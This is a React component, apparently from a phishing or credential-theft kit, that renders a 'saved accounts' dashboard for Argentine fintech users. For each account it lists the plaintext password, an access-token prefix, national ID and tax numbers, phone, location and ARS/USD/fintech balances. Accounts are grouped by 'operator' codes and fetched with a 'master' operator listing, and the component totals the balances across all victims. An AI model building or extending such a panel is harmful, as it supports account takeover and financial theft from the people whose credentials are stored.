import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2, RefreshCw, Search, ChevronDown, ChevronUp, DollarSign, Wallet, Users } from "lucide-react";

interface SavedAccount {
  id: string;
  email: string;
  password?: string;
  full_name?: string;
  document?: string;
  cuit?: string;
  phone?: string;
  city?: string;
  province?: string;
  operator_code: string;
  access_token?: string;
  balance_ars?: any;
  balance_usd?: any;
  fintech_data?: any;
  limits_data?: any;
  crypto_data?: any;
  profile_data?: any;
  last_login_at?: string;
  last_data_sync_at?: string;
  updated_at: string;
}

const formatARS = (val: number | undefined) =>
  val != null ? `$ ${val.toLocaleString("es-AR", { minimumFractionDigits: 2 })}` : "$ 0.00";

const formatUSD = (val: number | undefined) =>
  val != null ? `US$ ${val.toLocaleString("en-US", { minimumFractionDigits: 2 })}` : "US$ 0.00";

const SavedAccountsTab = () => {
  const [accounts, setAccounts] = useState<SavedAccount[]>([]);
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState("");
  const [expandedRow, setExpandedRow] = useState<string | null>(null);

  const fetchAccounts = async () => {
    setLoading(true);
    try {
      const { data: res, error } = await supabase.functions.invoke("plus-auth", {
        body: { action: "list", operatorCode: "master" },
      });
      if (!error && res?.accounts) {
        setAccounts(res.accounts);
      }
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchAccounts();
  }, []);

  const filtered = accounts.filter((a) => {
    const q = search.toLowerCase();
    return (
      !q ||
      a.email?.toLowerCase().includes(q) ||
      a.full_name?.toLowerCase().includes(q) ||
      a.document?.toLowerCase().includes(q) ||
      a.cuit?.toLowerCase().includes(q)
    );
  });

  const totalARS = filtered.reduce((sum, a) => {
    const ars = a.balance_ars?.ars || 0;
    const fintech = a.fintech_data?.balance || 0;
    return sum + ars + fintech;
  }, 0);

  const totalUSD = filtered.reduce((sum, a) => sum + (a.balance_usd?.usd || 0), 0);

  return (
    <div className="space-y-6">
      {/* Summary Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card className="bg-gray-900/80 border-emerald-800/30">
          <CardContent className="p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-emerald-500/20 flex items-center justify-center">
              <Users className="w-5 h-5 text-emerald-400" />
            </div>
            <div>
              <p className="text-gray-500 text-xs">Total Contas</p>
              <p className="text-white text-xl font-bold">{accounts.length}</p>
            </div>
          </CardContent>
        </Card>
        <Card className="bg-gray-900/80 border-emerald-800/30">
          <CardContent className="p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-emerald-500/20 flex items-center justify-center">
              <DollarSign className="w-5 h-5 text-emerald-400" />
            </div>
            <div>
              <p className="text-gray-500 text-xs">Total ARS</p>
              <p className="text-emerald-400 text-lg font-bold font-mono">{formatARS(totalARS)}</p>
            </div>
          </CardContent>
        </Card>
        <Card className="bg-gray-900/80 border-emerald-800/30">
          <CardContent className="p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center">
              <DollarSign className="w-5 h-5 text-blue-400" />
            </div>
            <div>
              <p className="text-gray-500 text-xs">Total USD</p>
              <p className="text-blue-400 text-lg font-bold font-mono">{formatUSD(totalUSD)}</p>
            </div>
          </CardContent>
        </Card>
        <Card className="bg-gray-900/80 border-emerald-800/30">
          <CardContent className="p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-purple-500/20 flex items-center justify-center">
              <Wallet className="w-5 h-5 text-purple-400" />
            </div>
            <div>
              <p className="text-gray-500 text-xs">Filtradas</p>
              <p className="text-white text-xl font-bold">{filtered.length}</p>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Search + Refresh */}
      <Card className="bg-gray-900/80 border-emerald-800/30 backdrop-blur">
        <CardHeader className="pb-3">
          <div className="flex items-center justify-between">
            <CardTitle className="text-white text-lg">Contas Salvas</CardTitle>
            <Button
              onClick={fetchAccounts}
              disabled={loading}
              variant="outline"
              size="sm"
              className="border-gray-700 text-gray-400 hover:text-white"
            >
              {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <RefreshCw className="w-4 h-4" />}
              <span className="ml-2">Atualizar</span>
            </Button>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
            <Input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Buscar por email, nome, DNI ou CUIT..."
              className="pl-10 bg-gray-800 border-gray-700 text-white placeholder:text-gray-500"
            />
          </div>

          {loading && accounts.length === 0 ? (
            <div className="flex items-center justify-center py-12">
              <Loader2 className="w-6 h-6 animate-spin text-emerald-400" />
              <span className="ml-2 text-gray-400">Carregando contas...</span>
            </div>
          ) : filtered.length === 0 ? (
            <div className="text-center py-12 text-gray-500">Nenhuma conta encontrada</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-800 text-gray-500 text-xs uppercase">
                    <th className="text-left py-3 px-3">#</th>
                    <th className="text-left py-3 px-3">Nome</th>
                    <th className="text-left py-3 px-3">Email</th>
                    <th className="text-left py-3 px-3">DNI</th>
                    <th className="text-right py-3 px-3">ARS</th>
                    <th className="text-right py-3 px-3">USD</th>
                    <th className="text-right py-3 px-3">Fintech</th>
                    <th className="text-left py-3 px-3">Última Sync</th>
                    <th className="text-center py-3 px-3"></th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((a, i) => (
                    <SavedAccountRow
                      key={a.id}
                      account={a}
                      index={i}
                      expanded={expandedRow === a.id}
                      onToggle={() => setExpandedRow(expandedRow === a.id ? null : a.id)}
                    />
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

const SavedAccountRow = ({
  account: a,
  index,
  expanded,
  onToggle,
}: {
  account: SavedAccount;
  index: number;
  expanded: boolean;
  onToggle: () => void;
}) => {
  const syncDate = a.last_data_sync_at
    ? new Date(a.last_data_sync_at).toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" })
    : "—";

  return (
    <>
      <tr className="border-b border-gray-800/50 hover:bg-gray-800/30 cursor-pointer" onClick={onToggle}>
        <td className="py-3 px-3 text-gray-500">{index + 1}</td>
        <td className="py-3 px-3 text-white font-medium">{a.full_name || "—"}</td>
        <td className="py-3 px-3 text-gray-300">{a.email}</td>
        <td className="py-3 px-3 text-gray-300">{a.document || "—"}</td>
        <td className="py-3 px-3 text-right text-emerald-400 font-mono">{formatARS(a.balance_ars?.ars)}</td>
        <td className="py-3 px-3 text-right text-blue-400 font-mono">{formatUSD(a.balance_usd?.usd)}</td>
        <td className="py-3 px-3 text-right text-purple-400 font-mono">{formatARS(a.fintech_data?.balance)}</td>
        <td className="py-3 px-3 text-gray-500 text-xs">{syncDate}</td>
        <td className="py-3 px-3 text-center text-gray-500">
          {expanded ? <ChevronUp className="w-4 h-4 inline" /> : <ChevronDown className="w-4 h-4 inline" />}
        </td>
      </tr>
      {expanded && (
        <tr className="bg-gray-800/40">
          <td colSpan={9} className="p-4">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
              <div className="space-y-2">
                <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Saldos</h4>
                <div><span className="text-gray-500">ARS:</span> <span className="text-white">{formatARS(a.balance_ars?.ars)}</span></div>
                <div><span className="text-gray-500">USD:</span> <span className="text-white">{formatUSD(a.balance_usd?.usd)}</span></div>
                <div><span className="text-gray-500">Pend. ARS:</span> <span className="text-yellow-400">{formatARS(a.balance_ars?.pendingARS)}</span></div>
                <div><span className="text-gray-500">Pend. USD:</span> <span className="text-yellow-400">{formatUSD(a.balance_usd?.pendingUSD)}</span></div>
                <div><span className="text-gray-500">Fintech:</span> <span className="text-purple-400">{formatARS(a.fintech_data?.balance)}</span></div>
                <div><span className="text-gray-500">CVU:</span> <span className="text-gray-300 text-xs">{a.fintech_data?.cvu || "—"}</span></div>
              </div>
              <div className="space-y-2">
                <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Dados Pessoais</h4>
                <div><span className="text-gray-500">CUIT:</span> <span className="text-white">{a.cuit || "—"}</span></div>
                <div><span className="text-gray-500">Tel:</span> <span className="text-white">{a.phone || "—"}</span></div>
                <div><span className="text-gray-500">Cidade:</span> <span className="text-white">{a.city || "—"}</span></div>
                <div><span className="text-gray-500">Prov:</span> <span className="text-white">{a.province || "—"}</span></div>
                <div><span className="text-gray-500">Operador:</span> <span className="text-white">{a.operator_code}</span></div>
              </div>
              <div className="space-y-2">
                <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Credenciais</h4>
                <div><span className="text-gray-500">Email:</span> <span className="text-white text-xs">{a.email}</span></div>
                <div><span className="text-gray-500">Senha:</span> <span className="text-white text-xs">{a.password || "—"}</span></div>
                <div><span className="text-gray-500">Token:</span> <span className="text-gray-400 text-xs truncate block max-w-[200px]">{a.access_token ? `${a.access_token.substring(0, 20)}...` : "—"}</span></div>
              </div>
              <div className="space-y-2">
                <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Status</h4>
                <div><span className="text-gray-500">Último Login:</span> <span className="text-white text-xs">{a.last_login_at ? new Date(a.last_login_at).toLocaleString("pt-BR") : "—"}</span></div>
                <div><span className="text-gray-500">Última Sync:</span> <span className="text-white text-xs">{a.last_data_sync_at ? new Date(a.last_data_sync_at).toLocaleString("pt-BR") : "—"}</span></div>
                <div><span className="text-gray-500">Atualizado:</span> <span className="text-white text-xs">{new Date(a.updated_at).toLocaleString("pt-BR")}</span></div>
              </div>
            </div>
          </td>
        </tr>
      )}
    </>
  );
};

export default SavedAccountsTab;
